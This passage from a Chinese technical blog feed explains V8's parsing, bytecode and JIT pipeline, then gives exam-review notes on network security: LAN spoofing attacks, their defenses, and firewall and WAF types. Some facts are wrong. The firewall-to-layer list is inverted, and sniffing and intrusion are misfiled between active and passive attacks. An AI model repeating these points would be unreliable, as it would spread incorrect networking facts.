class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Punctuator&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Numeric&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Punctuator&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>分词（Tokenizing）和词法分析（Lexing）的区别在于：词法单元的识别是通过有状态还是无状态的方式进行的，无状态的为分词。这里“状态”的有无则是根据数据的处理过程是否需要考虑其他相关信息决定的。</p><p>在 JS 解析的过程中，我们需要考虑当前词法单元与前面的词法单元之间的关系，因此，JS 的解析是一个有状态的过程，我们就会将字符流转换为 token 的这一过程称为 Lexing 而非 Tokenizing。</p><h3 id="Parsing-语法分析"><a href="#Parsing-语法分析" class="headerlink" title="Parsing 语法分析"></a>Parsing 语法分析</h3><p><strong>语法分析</strong> 是将标记流转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树，我们称其为抽象语法树（AST）。</p><p>上文中的 Tokens 经过语法分析得到的 JSON 格式的 AST 如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Program&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VariableDeclaration&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;declarations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VariableDeclarator&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;init&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Literal&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;raw&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;const&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sourceType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;script&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>解析的过程就这么多，最终效果就是得到源码对应的AST。</p><p><a href="https://esprima.org/demo/parse.html#">Esprima</a> 站点提供了在线解析 JS 代码的功能，输入 JS 代码就可以得到经过 Lexing 的 Tokens 和 经过 Parsing 的 AST，可以动手尝试一下。</p><p>除此之外， <a href="https://astexplorer.net/">AST explorer</a> 站点也可以在线将 JS 代码转化为 AST。这个网站是基于 acorn.js 实现的，<a href="https://www.npmjs.com/package/acorn">acorn.js</a>  是一个 JavaScript Parser，你可以通过<code>npm</code>等包管理器下载并使用它。以下是一段使用 acorn.js 将指定代码转化为 AST 的案例。指定解析<code>console.log(1);</code>并以JSON格式输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Parser</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;acorn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> javascriptCode = <span class="string">`</span></span><br><span class="line"><span class="string">  console.log(1);</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ast = <span class="title class_">Parser</span>.<span class="title function_">parse</span>(javascriptCode, &#123; <span class="attr">ecmaVersion</span>: <span class="number">2024</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(ast));</span><br></pre></td></tr></table></figure><h2 id="Ignition-解释"><a href="#Ignition-解释" class="headerlink" title="Ignition 解释"></a>Ignition 解释</h2><p>Ignition 的主要功能是负责将 AST 转换为字节码（Bytecode）并解释执行。</p><p>Bytecode 是一种包含执行程序、由一序列 op 代码&#x2F;数据对组成的二进制文件，是一种中间码（IR），是机器码的一种抽象。它不面向任何机器，只面向当前虚拟机（这里是 V8 引擎）。</p><blockquote><p>我们常说的字节码多是指 Java 字节码，实际上很多动态编译解释的语言都有字节码，比如 Python&#x2F;JavaScript&#x2F;Ruby。</p></blockquote><p>早期的 V8 直接将 AST 编译为机器码，然后在机器中执行，因为这样的效率更高。但机器码会占用过多的系统内存，相比之下，Bytecode 占用的内存空间远比机器码少得多，Google 团队遂选择以时间换空间，转换为现在的 AST-&gt;Bytecode-&gt;机器码。</p><p><img src="https://img.ma5hr00m.top/blog/20240221083929.png" alt="20240221083929"></p><p>Node.js 提供了很多关于 V8 引擎的选项，比如<code>--print-bytecode</code>用于获取源码对应的字节码。</p><p>先编写这样一段 JS 代码并保存为 main.js 文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ma5hr00m</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">ma5hr00m</span>();</span><br></pre></td></tr></table></figure><p>然后使用<code>node --print-bytecode main.js</code>即可得到代码的 Bytecode，会输出非常非常多的内容，可以查找到<code>ma5hr00m()</code>函数对应的 Bytecode：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[generated bytecode <span class="keyword">for</span> <span class="attr">function</span>: <span class="title function_">ma5hr00m</span> (<span class="number">0x3ae97a693191</span> )]                                                                     </span><br><span class="line"><span class="title class_">Bytecode</span> <span class="attr">length</span>: <span class="number">19</span>                                                                                                                                            </span><br><span class="line"><span class="title class_">Parameter</span> count <span class="number">1</span>                                                                                                                                              </span><br><span class="line"><span class="title class_">Register</span> count <span class="number">3</span>                                                                                                                                               </span><br><span class="line"><span class="title class_">Frame</span> size <span class="number">24</span>                                                                                                                                                  </span><br><span class="line"><span class="title class_">Bytecode</span> <span class="attr">age</span>: <span class="number">0</span>                                                                                                                                                </span><br><span class="line">   <span class="number">24</span> S&gt; <span class="number">0x3ae97a6940ee</span> @    <span class="number">0</span> : <span class="number">21</span> <span class="number">00</span> <span class="number">00</span>          <span class="title class_">LdaGlobal</span> [<span class="number">0</span>], [<span class="number">0</span>]                                                                                          </span><br><span class="line">         <span class="number">0x3ae97a6940f1</span> @    <span class="number">3</span> : c3                <span class="title class_">Star1</span>                                                                                                       </span><br><span class="line">   <span class="number">32</span> E&gt; <span class="number">0x3ae97a6940f2</span> @    <span class="number">4</span> : 2d f9 <span class="number">01</span> <span class="number">02</span>       <span class="title class_">GetNamedProperty</span> r1, [<span class="number">1</span>], [<span class="number">2</span>]                                                                               </span><br><span class="line">         <span class="number">0x3ae97a6940f6</span> @    <span class="number">8</span> : c4                <span class="title class_">Star0</span>                                                                                                       </span><br><span class="line">         <span class="number">0x3ae97a6940f7</span> @    <span class="number">9</span> : 0d <span class="number">01</span>             <span class="title class_">LdaSmi</span> [<span class="number">1</span>]                                                                                                  </span><br><span class="line">         <span class="number">0x3ae97a6940f9</span> @   <span class="number">11</span> : c2                <span class="title class_">Star2</span>                                                                                                       </span><br><span class="line">   <span class="number">32</span> E&gt; <span class="number">0x3ae97a6940fa</span> @   <span class="number">12</span> : 5e fa f9 f8 <span class="number">04</span>    <span class="title class_">CallProperty1</span> r0, r1, r2, [<span class="number">4</span>]                                                                               </span><br><span class="line">         <span class="number">0x3ae97a6940ff</span> @   <span class="number">17</span> : 0e                <span class="title class_">LdaUndefined</span>                                                                                                </span><br><span class="line">   <span class="number">40</span> S&gt; <span class="number">0x3ae97a694100</span> @   <span class="number">18</span> : a9                <span class="title class_">Return</span>                                                                                                      </span><br><span class="line"><span class="title class_">Constant</span> <span class="title function_">pool</span> (size = <span class="number">2</span>)                                                                                                                                       </span><br><span class="line"><span class="number">0x3ae97a694099</span>: [<span class="title class_">FixedArray</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span>                                                                                                                       </span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x2a087bbc0211</span>                                                                                                                  </span><br><span class="line"> - <span class="attr">length</span>: <span class="number">2</span>                                                                                                                                                   </span><br><span class="line">           <span class="number">0</span>: <span class="number">0x2a087bbc5ce9</span>                                                                                                              </span><br><span class="line">           <span class="number">1</span>: <span class="number">0x398ad9accb91</span>                                                                                                                  </span><br><span class="line"><span class="title class_">Handler</span> <span class="title class_">Table</span> (size = <span class="number">0</span>)                                                                                                                                       </span><br><span class="line"><span class="title class_">Source</span> <span class="title class_">Position</span> <span class="title class_">Table</span> (size = <span class="number">10</span>)                                                                                                                              </span><br><span class="line"><span class="number">0x3ae97a694109</span> </span><br></pre></td></tr></table></figure><p>我们可以简单分析其中 Bytecode 字段对应的指令：</p><ul><li>从全局加载一个值到寄存器中；</li><li>将寄存器 1 的值存储到一个位置；</li><li>从一个对象中获取属性并存储到寄存器 0；</li><li>……</li></ul><p>这看起来很像我们学习过的汇编语言，或者说 Bytecode 就是抽象后的汇编，它仅面向虚拟机 CPU 而不是其他任何机器的 CPU，这就说明 V8 不需要为不同的 CPU 生成不同的代码，只需生成 Bytecode，这样也在某种程度上简化了 V8 的编译流程，提高了其可拓展性。</p><h2 id="TurboFan-编译"><a href="#TurboFan-编译" class="headerlink" title="TurboFan 编译"></a>TurboFan 编译</h2><p>TurboFan 负责将 Bytecode 转换为优化后的机器码。</p><p>前面说过，Ignition 子模块已经可以完成 AST-&gt;Bytecode 并解释执行，那为什么 V8 还需要 TurboFan 来编译 Bytecode 呢？</p><p>前面说过，JavaScript 是一门解释型的语言。解释型语言的特点是：</p><ul><li>运行时逐行被解释器解释并执行；</li><li>每次运行程序时都需要将源代码翻译成机器代码并执行；</li></ul><p>解释型语言的好处就是灵活且启动速度快，在 Web 应用场景下，这种策略是优于编译型语言的。但随着时代进步，Web 应用越来越庞大，解释型语言执行速度慢的缺点也逐渐凸显出来。在 V8 出现之前，所有 JS Engine 都采用着解释执行的方式。</p><p>而 V8 率先引入了即时编译（JIT）的设计，这种设计混合了解释执行和编译执行两种策略，极大地提升了 JS 的执行速度。之后其它 JS Engine 也是迅速跟进。</p><h3 id="JIT-即时编译"><a href="#JIT-即时编译" class="headerlink" title="JIT 即时编译"></a>JIT 即时编译</h3><p>Just-in-Time 技术是解释执行和编译执行二者之间权衡之后的产物。简单地说，V8 在启动过程中采用解释执行的策略，如果某段代码的超过某个阈值，V8 就会把这段代码编译成执行效率更高的机器码。</p><p>不同 Engine 在实现 JIT 的手段上存在区别，但总体思想是一致的，就是在 Engine 内部添加一个监视器。监视器负责监视代码的运行情况，记录代码一共运行了多少次、代码如何运行等。监视器会根据代码重复次数以及运行某段代码占用的执行时长，对代码进行标记，标记共分为<code>warm</code>、<code>hot</code>和<code>very hot</code>三个等级。</p><p>举个例子说明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arraySum</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        sum += arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码刚开始运行时，监视器监视着所有代码的运行情况。</p><p>如果同一行代码重复执行几次，监视器会把这段代码标记为<code>warm</code>。</p><p>被标记为<code>warm</code>的代码段会被 JIT 传递给 <em>基线编译器</em> 进行编译，并将结果储存。<code>warm</code>代码段的每一行都会被编译成一个<code>stub</code>，同时给这个<code>stub</code>分配一个以“行号 + 变量类型”的索引。此时并没有使用编译的代码替换原本的代码。</p><p>如果监视器监视到，某行某个变量使用了同样的变量类型在此多次执行同样的代码，就会将<code>warm</code>升级为<code>hot</code>，并把已编译的代码 push 给浏览器，浏览器接收后就会用编译后的代码替换原本的代码。</p><p>如果<code>hot</code>代码段重复次数非常多以至于占用了大部分执行时间，就标记为<code>very hot</code>。</p><p>被标记为<code>very hot</code>的代码段会被 JIT 传递给 <em>优化编译器</em> 进行编译，生成一个更快速和高效的代码版本，并且存储。例如上面这段代码，<code>sum</code>和<code>arr[i]</code>两个数并不保证都是整数（JS 动态类型），每次<code>+=</code>执行前都需要先判断一遍数据类型，如果这段代码重复执行了非常多次且每次这两个变量都是 INT 型，那这段代码被丢给优化编译器进行编译时，就会被优化为优先进行 INT 类型的判断，以节约时间。</p><p>如果上述经过优化的代码出现问题，某次执行数据判断的结果不是 INT 型，那这段经过优化编译得到的代码就会被直接丢弃，执行过程回到解释器&#x2F;基线解释器，这个过程被称为 <em>去优化</em>。</p><p>要注意，JIT 与虚拟机执行策略的选择有关，而和语言本身无关。除了 JS，其他解释型语言也会引入 JIT 技术，以提高执行效率。</p><h2 id="参阅文章"><a href="#参阅文章" class="headerlink" title="参阅文章"></a>参阅文章</h2><ul><li><a href="https://cheogo.github.io/learn-javascript/201709/runtime.html">JavaScript 语法解析、AST、V8、JIT</a></li><li><a href="https://kiwenlau.com/2019/07/16/how-does-v8-work/">JavaScript深入浅出第4课：V8引擎是如何工作的</a>，by 寒雁Talk</li><li><a href="https://zhuanlan.zhihu.com/p/25669120">WebAssembly 系列（二）JavaScript Just-in-time (JIT) 工作原理</a>，by 知乎</li><li><a href="https://juejin.cn/post/6863269040300032008">JS中的JIT与基本执行逻辑</a>，by 稀土掘金</li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络空间安全技术复习笔记</title>
      <link href="/2024/01/02/2024/end-review/"/>
      <url>/2024/01/02/2024/end-review/</url>
      
        <content type="html"><![CDATA[<h2 id="网络安全概论"><a href="#网络安全概论" class="headerlink" title="网络安全概论"></a>网络安全概论</h2><p>&#x3D;&#x3D;网络安全的基本目标&#x3D;&#x3D;：</p><ul><li>保密性：防止信息泄漏给非授权的个人或实体，只为授权用户使用的特性（传输加密、访问控制存储）。</li><li>完整性：只数据未经授权不能进行改变的特性，即确保信息在存储或传输过程中保持不被篡改，删除和伪造的特性（预防、消息认证技术）。</li><li>可用性：：信息被授权实体访问并按需使用的特性（备份和灾难恢复、应急响应、系统容侵）。</li><li>不可抵赖性：在信息交换过程中，所有参与者都不能否认和抵赖曾经完成的操作和承诺的特性（数字签名技术、可信第三方认证技术）。</li><li>可控性：对信息的传播过程及内容具有控制能力的特性（信息监控、审计、过滤）。</li></ul><p>&#x3D;&#x3D;CIA 安全模型&#x3D;&#x3D;：保密性、完整性、可用性，CIA 三元组</p><p>&#x3D;&#x3D;P2DR 模型的组成&#x3D;&#x3D;：</p><ul><li>策略：为实现信息系统的安全目标，对所有与信息系统安全相关的活动所制定的规则（核心）。</li><li>防护：信息系统的安全保护措施，由安全技术实现。</li><li>检测：了解和评估信息系统的安装状态，发现信息系统异常行为的机制。</li><li>响应：发现信息系统异常行为后采取的行动。</li></ul><h2 id="局域网攻击与防御技术"><a href="#局域网攻击与防御技术" class="headerlink" title="局域网攻击与防御技术"></a>局域网攻击与防御技术</h2><p>&#x3D;&#x3D;网络攻击的分类&#x3D;&#x3D;：主动攻击和被动攻击</p><p>&#x3D;&#x3D;主动攻击和被动攻击的定义&#x3D;&#x3D;：</p><ul><li>主动攻击：会改变网络中的信息、状态和信息流模式的攻击行为。主动攻击可以破坏信息的保密性、完整性和可用性（嗅探攻击、拒绝服务攻击、欺骗攻击）。</li><li>被动攻击：不会对经过网络传输的信息、网络状态和网络信息流模式产生影响的攻击行为。被动攻击一般只破坏信息的保密性（截获攻击、非法介入和登录）。</li></ul><p>&#x3D;&#x3D;窃听攻击的原理&#x3D;&#x3D;：</p><ul><li>集线器窃听：集线器是一个物理层设备，当数据包到达集线器时，它会将数据包广播到所有连接的端口上，攻击者可以通过监听集线器上的数据包来获取网络通信的敏感信息。</li><li>MAC 表溢出攻击原理：交换机使用 MAC 地址表来记录网络设备的 MAC 地址和相应的端口信息。攻击者可以发送大量伪造的 MAC 地址信息来使交换机的 MAC 表溢出，导致交换机进入混杂模式，将所有数据包广播到所有端口上，从而进行窃听攻击。</li><li>交换机端口镜像攻击原理：攻击者可以配置交换机的端口镜像功能，将目标端口上的数据镜像到攻击者控制的端口上，从而窃取网络通信的敏感信息。</li></ul><p>&#x3D;&#x3D;窃听攻击的防御机制&#x3D;&#x3D;：</p><ul><li>集线器：防止黑客终端接入集线器的措施。</li><li>交换机：需要有防止黑客终端接入交互机的措施，交换机需要具有防御 MAC 表溢出攻击的机制。</li><li>无线通信：嗅探攻击无法避免，需要对传输的信息进行加密，使得黑客终端即使嗅探到信息，也因为无法对信息解密而无法破坏信息的保密性。</li></ul><p>&#x3D;&#x3D;截获攻击原理&#x3D;&#x3D;：</p><ul><li>MAC 地址欺骗攻击的原理：MAC 地址欺骗攻击是指攻击者通过发送伪造的 MAC 地址信息，欺骗交换机或其他网络设备，使其将网络流量发送到攻击者控制的设备上。攻击者可以通过截获网络流量获取敏感信息。</li><li>DHCP 欺骗攻击的原理：终端访问网络前，需要配置网络信息，如 IP 地址、子网掩码、默认网管地址本地域名服务器地址等，可以手动配置，或通过 DHCP 自动从 DHCP 服务器获取。DHCP 欺骗攻击是指攻击者伪装成 DHCP 服务器，向网络中的设备发送虚假的 DHCP 响应，欺骗设备获取错误的 IP 地址、网关和 DNS 服务器等配置信息。攻击者可以通过截获网络流量获取敏感信息或中断网络连接。</li><li>ARP 欺骗攻击的原理：ARP 欺骗攻击是指攻击者发送伪造的 ARP 请求或响应，欺骗网络中的设备将目标 IP 地址与错误的 MAC 地址进行关联。攻击者可以通过截获网络流量获取敏感信息或中断网络连接。</li><li>生成树欺骗攻击的原理：生成树欺骗攻击是指攻击者发送伪造的生成树协议消息，欺骗交换机重新计算生成树，导致网络中断或数据流量被重定向到攻击者控制的设备上。攻击者可以通过截获网络流量获取敏感信息或中断网络连接。</li></ul><blockquote><p>😜 题目分析</p><p><em>ARP欺骗攻击</em> 是静态配置访问控制列表无法防御的。</p><p>静态配置访问控制列表（ACL）是一种在网络设备上配置的规则集，用于控制网络流量和限制对网络资源的访问。它可以基于源IP地址、目标IP地址、端口号等参数进行过滤和控制。</p><p>ARP（地址解析协议）欺骗攻击是一种利用局域网中的ARP协议漏洞的攻击方式。攻击者发送虚假的ARP响应消息，将网络中的IP地址与错误的MAC地址进行映射。这样，当其他设备发送数据包时，数据包将被发送到错误的目标设备，从而导致网络流量被重定向到攻击者控制的设备上。</p><p>静态配置访问控制列表无法有效防御ARP欺骗攻击，因为ACL是基于IP地址进行过滤和控制，而ARP欺骗攻击涉及到欺骗和篡改IP地址与MAC地址之间的映射关系，绕过了ACL的过滤规则。</p></blockquote><blockquote><p>😜 题目分析<br>访问控制列表是基于终端MAC地址的接入控制技术。<em>终端MAC地址</em> 是一个唯一标识网络设备的地址，通过控制访问控制列表中允许或禁止特定MAC地址的访问，可以实现对网络资源的访问控制。</p></blockquote><p>&#x3D;&#x3D;截获攻击防御&#x3D;&#x3D;：</p><ul><li>MAC地址：阻止黑客终端接入以太网，阻止黑客终端发送的以伪造的 MAC 地址为源 MAC 地址的 MAC 帧进入以太网。</li><li>DHCP欺骗攻击：不允许伪造的 DHCP 服务器接入局域网，如以太网交换机端口只允许接收经过验证的 DHCP 服务器发送的 DHCP 提供和确认消息。</li><li>ARP 欺骗攻击：以太网交换机可以提供鉴别 ARP 请求和响应报文中 IP 地址与 MAC 地址绑定项真伪的功能，以太网交换机只继续转发包含正确的 IP 地址与 MAC 地址绑定项的 ARP 请求和响应报文。</li><li>生成树欺骗攻击：不允许黑客终端参与网络生成树建立过程，即只在用于实现两个认证交换机之间互联的交换机端口启动生成树协议。</li></ul><blockquote><p>😜 题目分析</p><p>DHCP欺骗攻击的技术机理：</p><ul><li>终端随机选择为其配置网络信息的DHCP服务器</li><li>伪造的网络配置信息会造成终端严重的安全后果</li><li>网络中可以存在多台DHCP服务器</li></ul></blockquote><p>&#x3D;&#x3D;欺骗攻击原理&#x3D;&#x3D;：</p><ul><li>源 IP 地址欺骗攻击原理：源 IP 地址欺骗是指某个终端发送 IP 分组时，不是以该终端真实的 IP 地址作为源 IP 地址，而是用其它终端的 IP 地址，或者伪造一个本不存在的 IP 地址作为 IP 分组的源 IP 地址的行为。</li><li>钓鱼网站实施原理：钓鱼网站是指攻击者创建的伪装成合法网站的虚假网站，旨在欺骗用户提供个人敏感信息，如用户名、密码、信用卡信息等。攻击者通常通过伪造电子邮件、社交媒体链接或广告等方式引导用户访问钓鱼网站。</li></ul><p>&#x3D;&#x3D;欺骗攻击防御&#x3D;&#x3D;：</p><ul><li>源 IP 地址欺骗：网络接收到某个 IP 分组时，首先判别该 IP 分组的源 IP 地址是否与发送该 IP 分组的终端的 IP 地址一致，如果不一致，终止该 IP 分组的转发过程。</li><li>钓鱼网站：主机具有防御黑客入侵的能力，黑客无法修改主机信息；以太网交换机具有防止伪造的 DHCP 服务器介入的能力，只允许经过认证的 DHCP 服务器接入以太网；终端具有鉴别 Web 服务器的能力，证实 Web 服务器身份后，才对 Web 服务器进行访问。</li></ul><blockquote><p>😜 题目分析</p><p>Smurf攻击的技术机理：</p><ul><li>将ICMP ECHO请求报文广播给某个网络中的所有终端</li><li>所有接收到ECHO请求报文的终端向报文的源终端回送ECHO响应报文</li><li>将攻击目标的IP地址作为ICMP ECHO请求报文的源IP地址</li></ul></blockquote><h2 id="Web-攻击"><a href="#Web-攻击" class="headerlink" title="Web 攻击"></a>Web 攻击</h2><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>&#x3D;&#x3D;防火墙&#x3D;&#x3D;：防火墙是由软件和硬件组成的系统，它处于安全的网络和不安全的网络之间，属于边界防护设备，由系统管理员设置访问控制规则，对进出网络边界的数据流进行过滤。</p><p>&#x3D;&#x3D;防火墙分类（逻辑）&#x3D;&#x3D;：</p><ul><li>主机防火墙：针对于单个主机进行防护。</li><li>网络防火墙：往往处于网络入口或边缘，针对于网络入口进行防护，服务于防火墙背后的本地局域网。</li></ul><p>&#x3D;&#x3D;防火墙分类（物理）&#x3D;&#x3D;：</p><ul><li>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。</li><li>软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低。</li></ul><p>&#x3D;&#x3D;防火墙部署位置&#x3D;&#x3D;：</p><p>基于 OSI 模型，防火墙工作于 OSI 模型的层次越高，能提供的安全保护等级就越高。防火墙通常建立在 TCP&#x2F;IP 模型基础上， OSI 模型与<br>TCP&#x2F;IP 模型之间并不存在一一对应的关系。</p><p><img src="https://img.ma5hr00m.top/blog/20240126132811.png" alt="20240126132811"></p><ul><li>包过滤防火墙（应用层）</li><li>电路级网关防火墙（会话层 | ）</li><li>应用级网关防火墙（网络层 | IP协议）</li></ul><p>&#x3D;&#x3D;动态包过滤防火墙的工作原理&#x3D;&#x3D;：</p><ul><li><p>与普通包过滤防火墙相似，大部分工作于网络层。有些安全性高的动态包过滤防火墙，则工作于传输层。</p></li><li><p>动态包过滤防火墙的不同点：对外出数据包进行身份记录，便于下次让具有相同连接的数据包通过。</p></li><li><p>动态包过滤防火墙需要对已建连接和规则表进行动态维护，因此是动态的和有状态的。</p></li><li><p>典型的动态包过滤防火墙能够感觉到新建连接与已建连接之间的差别。</p></li><li><p>实现动态包过滤器有两种主要的方式：</p><ol><li>实时地改变普通包过滤器的规则集。</li><li>采用类似电路级网关的方式转发数据包。</li></ol></li></ul><p>&#x3D;&#x3D;动态包过滤防火墙的优&#x2F;缺点&#x3D;&#x3D;：</p><ul><li>优点：<ul><li>采用 SMP 技术时，对网络性能的影响非常小。</li><li>动态包过滤防火墙的安全性优于静态包过滤防火墙。</li><li>“ 状态感知”能力使其性能得到了显著提高。</li><li>如果不考虑操作系统成本，成本会很低。</li></ul></li><li>缺点：<ul><li>仅工作于网络层，仅检查 IP 头和 TCP 头。</li><li>没过滤数据包的净荷部分，仍具有较低的安全性。</li><li>容易遭受 IP 欺骗攻击。</li><li>难于创建规则，管理员创建时必须要考虑规则的先后次序。</li><li>如果在建立连接时没有遵循三步握手协议，会引入风险。</li></ul></li></ul><p>&#x3D;&#x3D;动态包过滤防火墙的防范作用&#x3D;&#x3D;：</p><ul><li>具有状态感知能力。</li><li>典型动态包过滤防火墙工作在网络层。</li><li>先进的动态包过滤防火墙位于传输层。</li><li>检查的数据包头信息：源地址、目的地址、应用或协议、源端口号、目的端口号</li><li>防火墙的作用就在于对经过的报文匹配 “ 规则 “ ，然后执行对应的 “ 动作 “, 所以，当报文经过这些关卡的时候，则必须匹配这个关卡上的规则。</li></ul><p>&#x3D;&#x3D;应用级防火墙（WAF）的原理&#x3D;&#x3D;：</p><p>依赖 WAF 的三种检测机制：</p><ul><li>协议验证：WAF 通过检测经过的 HTTP 请求和响应消息中各个字段的值可以发现不规范的 HTTP 请求和响应消息，这些不规范的 HTTP 请求和响应消息中往往包含攻击信息。</li><li>攻击特征：WAF 对每一个 HTTP 请求消息，根据攻击特征库中的每一个攻击行为，逐个检测相关字段，如果该 HTTP 请求消息的相关字段值中包含了某个攻击行为的特征信息，表明该 HTTP 请求消息是实施该攻击行为的 HTTP 请求消息。</li><li>应用规范：可以根据长期统计分析得出的规律来制定应用规范，当 Web 服务器访问方式与应用规范之间出现较大偏差时，表明 Web 服务器正在遭受攻击。</li></ul><blockquote><p>😜 